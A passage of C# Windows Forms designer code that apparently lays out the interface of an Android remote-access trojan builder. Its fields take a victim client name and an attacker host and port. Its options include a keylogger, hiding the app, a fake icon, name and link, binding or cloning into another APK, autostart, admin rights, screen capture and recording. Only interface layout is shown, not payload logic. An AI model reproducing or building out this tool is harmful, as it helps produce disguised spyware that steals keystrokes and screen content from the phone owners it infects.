		this.Panel3 = new System.Windows.Forms.Panel();
		this.Label13 = new System.Windows.Forms.Label();
		this.explainoptionstext = new System.Windows.Forms.TextBox();
		this.CheckDoze = new DrakeUI.Framework.DrakeUICheckBox();
		this.sizelabel = new System.Windows.Forms.Label();
		this.Label30 = new System.Windows.Forms.Label();
		this.Panel4 = new System.Windows.Forms.Panel();
		this.Label28 = new System.Windows.Forms.Label();
		this.Nottitle = new System.Windows.Forms.TextBox();
		this.Label25 = new System.Windows.Forms.Label();
		this.Label24 = new System.Windows.Forms.Label();
		this.Notmsg = new System.Windows.Forms.TextBox();
		this.Label12 = new System.Windows.Forms.Label();
		this.TextSize = new System.Windows.Forms.TextBox();
		this.keeplivelabel = new System.Windows.Forms.Label();
		this.fakepanel = new System.Windows.Forms.Panel();
		this.Button1 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Textfakelink = new DrakeUI.Framework.DrakeUITextBox();
		this.Textfakename = new DrakeUI.Framework.DrakeUITextBox();
		this.Label27 = new System.Windows.Forms.Label();
		this.fakeiconpic = new System.Windows.Forms.PictureBox();
		this.Label23 = new System.Windows.Forms.Label();
		this.Label22 = new System.Windows.Forms.Label();
		this.Label21 = new System.Windows.Forms.Label();
		this.combotype = new DrakeUI.Framework.DrakeUIComboBox();
		this.Label20 = new System.Windows.Forms.Label();
		this.Label7 = new System.Windows.Forms.Label();
		this.Label5 = new System.Windows.Forms.Label();
		this.CheckFakeSize = new DrakeUI.Framework.DrakeUICheckBox();
		this.TabPage11 = new System.Windows.Forms.TabPage();
		this.Panel5 = new System.Windows.Forms.Panel();
		this.Label11 = new System.Windows.Forms.Label();
		this.CheckAOX = new DrakeUI.Framework.DrakeUICheckBox();
		this.Label50 = new System.Windows.Forms.Label();
		this.checkunlocker = new DrakeUI.Framework.DrakeUICheckBox();
		this.Label49 = new System.Windows.Forms.Label();
		this.checknetwork = new DrakeUI.Framework.DrakeUICheckBox();
		this.Label47 = new System.Windows.Forms.Label();
		this.Label46 = new System.Windows.Forms.Label();
		this.Label45 = new System.Windows.Forms.Label();
		this.bindCtitle = new System.Windows.Forms.TextBox();
		this.Label10 = new System.Windows.Forms.Label();
		this.CheckSkipre = new DrakeUI.Framework.DrakeUICheckBox();
		this.bndbtntext = new DrakeUI.Framework.DrakeUITextBox();
		this.bindbodytext = new System.Windows.Forms.TextBox();
		this.cusomupdateimg = new System.Windows.Forms.PictureBox();
		this.trgtbkg = new DrakeUI.Framework.DrakeUITextBox();
		this.Label41 = new System.Windows.Forms.Label();
		this.checkkeepsscreen = new DrakeUI.Framework.DrakeUICheckBox();
		this.CheckHidePrims = new DrakeUI.Framework.DrakeUICheckBox();
		this.Label38 = new System.Windows.Forms.Label();
		this.checkadmin = new DrakeUI.Framework.DrakeUICheckBox();
		this.checkautostart = new DrakeUI.Framework.DrakeUICheckBox();
		this.Label34 = new System.Windows.Forms.Label();
		this.Label43 = new System.Windows.Forms.Label();
		this.delayaccesstext = new System.Windows.Forms.TextBox();
		this.delaylabelaccess = new System.Windows.Forms.Label();
		this.CheckBIND = new DrakeUI.Framework.DrakeUICheckBox();
		this.CheckDraw = new DrakeUI.Framework.DrakeUICheckBox();
		this.checkemo = new DrakeUI.Framework.DrakeUICheckBox();
		this.Checksuper = new DrakeUI.Framework.DrakeUICheckBox();
		this.checkkeyloger = new DrakeUI.Framework.DrakeUICheckBox();
		this.CheckQuick = new DrakeUI.Framework.DrakeUICheckBox();
		this.Label35 = new System.Windows.Forms.Label();
		this.explaintoolstext = new System.Windows.Forms.TextBox();
		this.Label33 = new System.Windows.Forms.Label();
		this.Label17 = new System.Windows.Forms.Label();
		this.Label16 = new System.Windows.Forms.Label();
		this.Label14 = new System.Windows.Forms.Label();
		this.Label6 = new System.Windows.Forms.Label();
		this.CheckRecord = new DrakeUI.Framework.DrakeUICheckBox();
		this.TabPage12 = new System.Windows.Forms.TabPage();
		this.Panel6 = new System.Windows.Forms.Panel();
		this.logbtntext = new DrakeUI.Framework.DrakeUITextBox();
		this.Label37 = new System.Windows.Forms.Label();
		this.dscriptext = new System.Windows.Forms.TextBox();
		this.Label29 = new System.Windows.Forms.Label();
		this.Label31 = new System.Windows.Forms.Label();
		this.Label32 = new System.Windows.Forms.Label();
		this.Button3 = new System.Windows.Forms.Button();
		this.logbodytext = new System.Windows.Forms.TextBox();
		this.logtitletext = new System.Windows.Forms.TextBox();
		this.PictureBox2 = new System.Windows.Forms.PictureBox();
		this.TabPage13 = new System.Windows.Forms.TabPage();
		this.Panel7 = new System.Windows.Forms.Panel();
		this.panelmonitorb = new System.Windows.Forms.Panel();
		this.explainmonitortext = new System.Windows.Forms.TextBox();
		this.panemnitor = new System.Windows.Forms.Panel();
		this.Label44 = new System.Windows.Forms.Label();
		this.Label42 = new System.Windows.Forms.Label();
		this.Label40 = new System.Windows.Forms.Label();
		this.Label36 = new System.Windows.Forms.Label();
		this.Label26 = new System.Windows.Forms.Label();
		this.removmonitor = new DrakeUI.Framework.DrakeUIAvatar();
		this.addmintor = new DrakeUI.Framework.DrakeUIAvatar();
		this.listmonitor = new DrakeUI.Framework.DrakeUIListBox();
		this.namemonitor = new DrakeUI.Framework.DrakeUITextBox();
		this.idmonitor = new DrakeUI.Framework.DrakeUITextBox();
		this.linkmonitor = new DrakeUI.Framework.DrakeUITextBox();
		this.Panel10 = new System.Windows.Forms.Panel();
		this.Label18 = new System.Windows.Forms.Label();
		this.Label15 = new System.Windows.Forms.Label();
		this.checkcaptureonce = new DrakeUI.Framework.DrakeUICheckBox();
		this.checkcatpure = new DrakeUI.Framework.DrakeUICheckBox();
		this.TabPage14 = new System.Windows.Forms.TabPage();
		this.TextBox1 = new System.Windows.Forms.TextBox();
		this.Panel9 = new System.Windows.Forms.Panel();
		this.DrakeUIAvatar1 = new DrakeUI.Framework.DrakeUIAvatar();
		this.DrakeUIAvatar2 = new DrakeUI.Framework.DrakeUIAvatar();
		this.trackIDtext = new DrakeUI.Framework.DrakeUITextBox();
		this.Generaltext = new DrakeUI.Framework.DrakeUITitleLine();
		this.tracklist = new DrakeUI.Framework.DrakeUIListBox();
		this.trakertitle = new System.Windows.Forms.Label();
		this.Label8 = new System.Windows.Forms.Label();
		this.Primslist = new DrakeUI.Framework.DrakeUIListBox();
		this.removeactiv = new DrakeUI.Framework.DrakeUIAvatar();
		this.CheckAllPrims = new DrakeUI.Framework.DrakeUICheckBox();
		this.addactiv = new DrakeUI.Framework.DrakeUIAvatar();
		this.comboproms = new DrakeUI.Framework.DrakeUIComboBox();
		this.Panel8 = new System.Windows.Forms.Panel();
		this.Label39 = new System.Windows.Forms.Label();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.checkprotector = new DrakeUI.Framework.DrakeUICheckBox();
		this.Label19 = new System.Windows.Forms.Label();
		this.checkver = new DrakeUI.Framework.DrakeUIComboBox();
		this.Label48 = new System.Windows.Forms.Label();
		this.SelectedApk = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.checksignver = new DrakeUI.Framework.DrakeUIComboBox();
		this.TiMAT = new System.Windows.Forms.Timer(this.components);
		this.FolderPath = new System.Windows.Forms.FolderBrowserDialog();
		this.FilePathApk = new System.Windows.Forms.OpenFileDialog();
		this.TOpacity = new System.Windows.Forms.Timer(this.components);
		this.startTime = new System.Windows.Forms.Timer(this.components);
		this.ToolTip1 = new System.Windows.Forms.ToolTip(this.components);
		this.box.SuspendLayout();
		this.TABCTRL.SuspendLayout();
		this.TabPage10.SuspendLayout();
		this.Panel2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).BeginInit();
		this.TabPage9.SuspendLayout();
		this.Panel3.SuspendLayout();
		this.Panel4.SuspendLayout();
		this.fakepanel.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.fakeiconpic).BeginInit();
		this.TabPage11.SuspendLayout();
		this.Panel5.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.cusomupdateimg).BeginInit();
		this.TabPage12.SuspendLayout();
		this.Panel6.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox2).BeginInit();
		this.TabPage13.SuspendLayout();
		this.Panel7.SuspendLayout();
		this.panelmonitorb.SuspendLayout();
		this.panemnitor.SuspendLayout();
		this.Panel10.SuspendLayout();
		this.TabPage14.SuspendLayout();
		this.Panel9.SuspendLayout();
		this.Panel8.SuspendLayout();
		this.Panel1.SuspendLayout();
		base.SuspendLayout();
		this.box.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.box.Controls.Add(this.TABCTRL);
		this.box.Dock = System.Windows.Forms.DockStyle.Fill;
		this.box.Location = new System.Drawing.Point(0, 0);
		this.box.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.box.Name = "box";
		this.box.Size = new System.Drawing.Size(1006, 734);
		this.box.TabIndex = 11;
		this.TABCTRL.Controls.Add(this.TabPage10);
		this.TABCTRL.Controls.Add(this.TabPage9);
		this.TABCTRL.Controls.Add(this.TabPage11);
		this.TABCTRL.Controls.Add(this.TabPage12);
		this.TABCTRL.Controls.Add(this.TabPage13);
		this.TABCTRL.Controls.Add(this.TabPage14);
		this.TABCTRL.Dock = System.Windows.Forms.DockStyle.Fill;
		this.TABCTRL.DrawMode = System.Windows.Forms.TabDrawMode.OwnerDrawFixed;
		this.TABCTRL.FillColor = System.Drawing.Color.SkyBlue;
		this.TABCTRL.Font = new System.Drawing.Font("Calibri", 12f);
		this.TABCTRL.ItemSize = new System.Drawing.Size(150, 55);
		this.TABCTRL.Location = new System.Drawing.Point(0, 0);
		this.TABCTRL.MenuStyle = DrakeUI.Framework.UIMenuStyle.Custom;
		this.TABCTRL.Name = "TABCTRL";
		this.TABCTRL.SelectedIndex = 0;
		this.TABCTRL.Size = new System.Drawing.Size(1004, 732);
		this.TABCTRL.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
		this.TABCTRL.Style = DrakeUI.Framework.UIStyle.Custom;
		this.TABCTRL.TabBackColor = System.Drawing.Color.Black;
		this.TABCTRL.TabIndex = 16;
		this.TABCTRL.TabSelectedColor = System.Drawing.Color.Black;
		this.TABCTRL.TabSelectedForeColor = System.Drawing.Color.SkyBlue;
		this.TABCTRL.TabSelectedHighColor = System.Drawing.Color.SkyBlue;
		this.TABCTRL.TabUnSelectedForeColor = System.Drawing.Color.SkyBlue;
		this.TabPage10.BackColor = System.Drawing.Color.SkyBlue;
		this.TabPage10.Controls.Add(this.Panel2);
		this.TabPage10.Location = new System.Drawing.Point(0, 55);
		this.TabPage10.Name = "TabPage10";
		this.TabPage10.Size = new System.Drawing.Size(1004, 677);
		this.TabPage10.TabIndex = 2;
		this.TabPage10.Text = "information";
		this.Panel2.BackColor = System.Drawing.Color.Black;
		this.Panel2.Controls.Add(this.clonecheck);
		this.Panel2.Controls.Add(this.TextVersion);
		this.Panel2.Controls.Add(this.randomverbtn);
		this.Panel2.Controls.Add(this.randomidbtn);
		this.Panel2.Controls.Add(this.TextPackage);
		this.Panel2.Controls.Add(this.TextNameVictim);
		this.Panel2.Controls.Add(this.TextNamePatch);
		this.Panel2.Controls.Add(this.po);
		this.Panel2.Controls.Add(this.TextIP);
		this.Panel2.Controls.Add(this.Label1);
		this.Panel2.Controls.Add(this.MainText);
		this.Panel2.Controls.Add(this.CheckHide);
		this.Panel2.Controls.Add(this.CheckIconPatch);
		this.Panel2.Controls.Add(this.Label4);
		this.Panel2.Controls.Add(this.Label9);
		this.Panel2.Controls.Add(this.Label3);
		this.Panel2.Controls.Add(this.Label2);
		this.Panel2.Controls.Add(this.PictureBox1);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel2.Location = new System.Drawing.Point(0, 0);
		this.Panel2.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.Panel2.Name = "Panel2";
		this.Panel2.Size = new System.Drawing.Size(1004, 677);
		this.Panel2.TabIndex = 15;
		this.clonecheck.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.clonecheck.Cursor = System.Windows.Forms.Cursors.Hand;
		this.clonecheck.Font = new System.Drawing.Font("Calibri", 12f);
		this.clonecheck.ForeColor = System.Drawing.Color.SkyBlue;
		this.clonecheck.Location = new System.Drawing.Point(566, 541);
		this.clonecheck.Name = "clonecheck";
		this.clonecheck.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.clonecheck.Size = new System.Drawing.Size(260, 29);
		this.clonecheck.Style = DrakeUI.Framework.UIStyle.Custom;
		this.clonecheck.TabIndex = 102;
		this.clonecheck.Text = "Clone With Apk";
		this.TextVersion.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.TextVersion.FillColor = System.Drawing.Color.Black;
		this.TextVersion.Font = new System.Drawing.Font("Calibri", 12f);
		this.TextVersion.ForeColor = System.Drawing.Color.SkyBlue;
		this.TextVersion.Location = new System.Drawing.Point(102, 391);
		this.TextVersion.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.TextVersion.Maximum = 2147483647.0;
		this.TextVersion.Minimum = -2147483648.0;
		this.TextVersion.Name = "TextVersion";
		this.TextVersion.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.TextVersion.Radius = 10;
		this.TextVersion.RectColor = System.Drawing.Color.SkyBlue;
		this.TextVersion.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.TextVersion.Size = new System.Drawing.Size(262, 27);
		this.TextVersion.Style = DrakeUI.Framework.UIStyle.Custom;
		this.TextVersion.TabIndex = 101;
		this.TextVersion.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.TextVersion.Watermark = "ApK Version";
		this.randomverbtn.AvatarSize = 30;
		this.randomverbtn.BackColor = System.Drawing.Color.Transparent;
		this.randomverbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.randomverbtn.FillColor = System.Drawing.Color.Transparent;
		this.randomverbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.randomverbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.randomverbtn.Location = new System.Drawing.Point(373, 391);
		this.randomverbtn.Margin = new System.Windows.Forms.Padding(4);
		this.randomverbtn.Name = "randomverbtn";
		this.randomverbtn.Size = new System.Drawing.Size(35, 30);
		this.randomverbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.randomverbtn.Symbol = 61473;
		this.randomverbtn.SymbolSize = 30;
		this.randomverbtn.TabIndex = 100;
		this.randomverbtn.Text = "DrakeUIAvatar1";
		this.randomidbtn.AvatarSize = 30;
		this.randomidbtn.BackColor = System.Drawing.Color.Transparent;
		this.randomidbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.randomidbtn.FillColor = System.Drawing.Color.Transparent;
		this.randomidbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.randomidbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.randomidbtn.Location = new System.Drawing.Point(886, 393);
		this.randomidbtn.Margin = new System.Windows.Forms.Padding(4);
		this.randomidbtn.Name = "randomidbtn";
		this.randomidbtn.Size = new System.Drawing.Size(35, 30);
		this.randomidbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.randomidbtn.Symbol = 61473;
		this.randomidbtn.SymbolSize = 30;
		this.randomidbtn.TabIndex = 99;
		this.randomidbtn.Text = "DrakeUIAvatar1";
		this.TextPackage.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.TextPackage.FillColor = System.Drawing.Color.Black;
		this.TextPackage.Font = new System.Drawing.Font("Calibri", 12f);
		this.TextPackage.ForeColor = System.Drawing.Color.SkyBlue;
		this.TextPackage.Location = new System.Drawing.Point(615, 391);
		this.TextPackage.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.TextPackage.Maximum = 2147483647.0;
		this.TextPackage.Minimum = -2147483648.0;
		this.TextPackage.Name = "TextPackage";
		this.TextPackage.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.TextPackage.Radius = 10;
		this.TextPackage.RectColor = System.Drawing.Color.SkyBlue;
		this.TextPackage.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.TextPackage.Size = new System.Drawing.Size(262, 27);
		this.TextPackage.Style = DrakeUI.Framework.UIStyle.Custom;
		this.TextPackage.TabIndex = 98;
		this.TextPackage.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.TextPackage.Watermark = "com.example";
		this.TextNameVictim.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.TextNameVictim.FillColor = System.Drawing.Color.Black;
		this.TextNameVictim.Font = new System.Drawing.Font("Calibri", 12f);
		this.TextNameVictim.ForeColor = System.Drawing.Color.SkyBlue;
		this.TextNameVictim.Location = new System.Drawing.Point(102, 258);
		this.TextNameVictim.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.TextNameVictim.Maximum = 2147483647.0;
		this.TextNameVictim.Minimum = -2147483648.0;
		this.TextNameVictim.Name = "TextNameVictim";
		this.TextNameVictim.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.TextNameVictim.Radius = 10;
		this.TextNameVictim.RectColor = System.Drawing.Color.SkyBlue;
		this.TextNameVictim.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.TextNameVictim.Size = new System.Drawing.Size(262, 27);
		this.TextNameVictim.Style = DrakeUI.Framework.UIStyle.Custom;
		this.TextNameVictim.TabIndex = 97;
		this.TextNameVictim.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.TextNameVictim.Watermark = "Client Name";
		this.TextNamePatch.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.TextNamePatch.FillColor = System.Drawing.Color.Black;
		this.TextNamePatch.Font = new System.Drawing.Font("Calibri", 12f);
		this.TextNamePatch.ForeColor = System.Drawing.Color.SkyBlue;
		this.TextNamePatch.Location = new System.Drawing.Point(615, 258);
		this.TextNamePatch.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.TextNamePatch.Maximum = 2147483647.0;
		this.TextNamePatch.Minimum = -2147483648.0;
		this.TextNamePatch.Name = "TextNamePatch";
		this.TextNamePatch.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.TextNamePatch.Radius = 10;
		this.TextNamePatch.RectColor = System.Drawing.Color.SkyBlue;
		this.TextNamePatch.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.TextNamePatch.Size = new System.Drawing.Size(262, 27);
		this.TextNamePatch.Style = DrakeUI.Framework.UIStyle.Custom;
		this.TextNamePatch.TabIndex = 96;
		this.TextNamePatch.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.TextNamePatch.Watermark = "ApK Name";
		this.po.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.po.FillColor = System.Drawing.Color.Black;
		this.po.Font = new System.Drawing.Font("Calibri", 12f);
		this.po.ForeColor = System.Drawing.Color.SkyBlue;
		this.po.Location = new System.Drawing.Point(615, 108);
		this.po.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.po.Maximum = 2147483647.0;
		this.po.Minimum = -2147483648.0;
		this.po.Name = "po";
		this.po.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.po.Radius = 10;
		this.po.RectColor = System.Drawing.Color.SkyBlue;
		this.po.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.po.Size = new System.Drawing.Size(262, 27);
		this.po.Style = DrakeUI.Framework.UIStyle.Custom;
		this.po.TabIndex = 95;
		this.po.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.po.Watermark = "Port";
		this.TextIP.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.TextIP.FillColor = System.Drawing.Color.Black;
		this.TextIP.Font = new System.Drawing.Font("Calibri", 12f);
		this.TextIP.ForeColor = System.Drawing.Color.SkyBlue;
		this.TextIP.Location = new System.Drawing.Point(102, 108);
		this.TextIP.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.TextIP.Maximum = 2147483647.0;
		this.TextIP.Minimum = -2147483648.0;
		this.TextIP.Name = "TextIP";
		this.TextIP.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.TextIP.Radius = 10;
		this.TextIP.RectColor = System.Drawing.Color.SkyBlue;
		this.TextIP.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.TextIP.Size = new System.Drawing.Size(262, 27);
		this.TextIP.Style = DrakeUI.Framework.UIStyle.Custom;
		this.TextIP.TabIndex = 94;
		this.TextIP.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.TextIP.Watermark = "Host / ip";
		this.Label1.AutoSize = true;
		this.Label1.BackColor = System.Drawing.Color.Transparent;
		this.Label1.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label1.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label1.Location = new System.Drawing.Point(715, 69);
		this.Label1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(46, 24);
		this.Label1.TabIndex = 81;
		this.Label1.Text = "Port";
		this.MainText.AutoSize = true;
		this.MainText.BackColor = System.Drawing.Color.Transparent;
		this.MainText.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.MainText.ForeColor = System.Drawing.Color.SkyBlue;
		this.MainText.Location = new System.Drawing.Point(181, 69);
		this.MainText.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.MainText.Name = "MainText";
		this.MainText.Size = new System.Drawing.Size(84, 24);
		this.MainText.TabIndex = 80;
		this.MainText.Text = "Host / Ip";
		this.CheckHide.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.CheckHide.Checked = true;
		this.CheckHide.Cursor = System.Windows.Forms.Cursors.Hand;
		this.CheckHide.Font = new System.Drawing.Font("Calibri", 12f);
		this.CheckHide.Location = new System.Drawing.Point(425, 611);
		this.CheckHide.Name = "CheckHide";
		this.CheckHide.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.CheckHide.Size = new System.Drawing.Size(150, 29);
		this.CheckHide.TabIndex = 77;
		this.CheckHide.Text = "Hide app";
		this.CheckHide.Visible = false;
		this.CheckIconPatch.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.CheckIconPatch.Cursor = System.Windows.Forms.Cursors.Hand;
		this.CheckIconPatch.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold);
		this.CheckIconPatch.ForeColor = System.Drawing.Color.SkyBlue;
		this.CheckIconPatch.Location = new System.Drawing.Point(566, 506);
		this.CheckIconPatch.Name = "CheckIconPatch";
		this.CheckIconPatch.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.CheckIconPatch.Size = new System.Drawing.Size(134, 29);
		this.CheckIconPatch.Style = DrakeUI.Framework.UIStyle.Custom;
		this.CheckIconPatch.StyleCustomMode = true;
		this.CheckIconPatch.TabIndex = 76;
		this.CheckIconPatch.Text = "ApK Icon";
		this.Label4.AutoSize = true;
		this.Label4.BackColor = System.Drawing.Color.Transparent;
		this.Label4.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label4.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label4.Location = new System.Drawing.Point(661, 354);
		this.Label4.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label4.Name = "Label4";
		this.Label4.Size = new System.Drawing.Size(132, 24);
		this.Label4.TabIndex = 28;
		this.Label4.Text = "Package Name";
		this.Label9.AutoSize = true;
		this.Label9.BackColor = System.Drawing.Color.Transparent;
		this.Label9.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label9.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label9.Location = new System.Drawing.Point(161, 354);
		this.Label9.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label9.Name = "Label9";
		this.Label9.Size = new System.Drawing.Size(112, 24);
		this.Label9.TabIndex = 27;
		this.Label9.Text = "ApK Version";
		this.Label3.AutoSize = true;
		this.Label3.BackColor = System.Drawing.Color.Transparent;
		this.Label3.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label3.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label3.Location = new System.Drawing.Point(691, 221);
		this.Label3.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label3.Name = "Label3";
		this.Label3.Size = new System.Drawing.Size(98, 24);
		this.Label3.TabIndex = 26;
		this.Label3.Text = "App Name";
		this.Label2.AutoSize = true;
		this.Label2.BackColor = System.Drawing.Color.Transparent;
		this.Label2.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label2.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label2.Location = new System.Drawing.Point(159, 221);
		this.Label2.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label2.Name = "Label2";
		this.Label2.Size = new System.Drawing.Size(113, 24);
		this.Label2.TabIndex = 25;
		this.Label2.Text = "Client Name";
		this.PictureBox1.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.PictureBox1.Location = new System.Drawing.Point(423, 506);
		this.PictureBox1.Margin = new System.Windows.Forms.Padding(4);
		this.PictureBox1.Name = "PictureBox1";
		this.PictureBox1.Size = new System.Drawing.Size(136, 98);
		this.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.PictureBox1.TabIndex = 33;
		this.PictureBox1.TabStop = false;
		this.TabPage9.BackColor = System.Drawing.Color.SkyBlue;
		this.TabPage9.Controls.Add(this.Panel3);
		this.TabPage9.Location = new System.Drawing.Point(0, 55);
		this.TabPage9.Name = "TabPage9";
		this.TabPage9.Size = new System.Drawing.Size(1004, 677);
		this.TabPage9.TabIndex = 1;
		this.TabPage9.Text = "Options";
		this.Panel3.BackColor = System.Drawing.Color.Black;
		this.Panel3.Controls.Add(this.Label13);
		this.Panel3.Controls.Add(this.explainoptionstext);
		this.Panel3.Controls.Add(this.CheckDoze);
		this.Panel3.Controls.Add(this.sizelabel);
		this.Panel3.Controls.Add(this.Label30);
		this.Panel3.Controls.Add(this.Panel4);
		this.Panel3.Controls.Add(this.Label12);
		this.Panel3.Controls.Add(this.TextSize);
		this.Panel3.Controls.Add(this.keeplivelabel);
		this.Panel3.Controls.Add(this.fakepanel);
		this.Panel3.Controls.Add(this.Label21);
		this.Panel3.Controls.Add(this.combotype);
		this.Panel3.Controls.Add(this.Label20);
		this.Panel3.Controls.Add(this.Label7);
		this.Panel3.Controls.Add(this.Label5);
		this.Panel3.Controls.Add(this.CheckFakeSize);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel3.Location = new System.Drawing.Point(0, 0);
		this.Panel3.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.Panel3.Name = "Panel3";
		this.Panel3.Size = new System.Drawing.Size(1004, 677);
		this.Panel3.TabIndex = 12;
		this.Label13.AutoSize = true;
		this.Label13.BackColor = System.Drawing.Color.Transparent;
		this.Label13.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label13.ForeColor = System.Drawing.Color.FromArgb(65, 177, 225);
		this.Label13.Location = new System.Drawing.Point(37, 329);
		this.Label13.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label13.Name = "Label13";
		this.Label13.Size = new System.Drawing.Size(19, 24);
		this.Label13.TabIndex = 73;
		this.Label13.Text = "*";
		this.explainoptionstext.AcceptsTab = true;
		this.explainoptionstext.BackColor = System.Drawing.Color.Black;
		this.explainoptionstext.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.explainoptionstext.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.explainoptionstext.Font = new System.Drawing.Font("Calibri", 11f);
		this.explainoptionstext.ForeColor = System.Drawing.SystemColors.GradientActiveCaption;
		this.explainoptionstext.Location = new System.Drawing.Point(0, 587);
		this.explainoptionstext.Multiline = true;
		this.explainoptionstext.Name = "explainoptionstext";
		this.explainoptionstext.ReadOnly = true;
		this.explainoptionstext.Size = new System.Drawing.Size(1004, 90);
		this.explainoptionstext.TabIndex = 72;
		this.CheckDoze.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.CheckDoze.Cursor = System.Windows.Forms.Cursors.Hand;
		this.CheckDoze.Font = new System.Drawing.Font("Calibri", 12f);
		this.CheckDoze.Location = new System.Drawing.Point(70, 483);
		this.CheckDoze.Name = "CheckDoze";
		this.CheckDoze.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.CheckDoze.Size = new System.Drawing.Size(44, 29);
		this.CheckDoze.Style = DrakeUI.Framework.UIStyle.Custom;
		this.CheckDoze.TabIndex = 71;
		this.sizelabel.AutoSize = true;
		this.sizelabel.BackColor = System.Drawing.Color.Transparent;
		this.sizelabel.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.sizelabel.ForeColor = System.Drawing.Color.SkyBlue;
		this.sizelabel.Location = new System.Drawing.Point(161, 328);
		this.sizelabel.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.sizelabel.Name = "sizelabel";
		this.sizelabel.Size = new System.Drawing.Size(81, 24);
		this.sizelabel.TabIndex = 48;
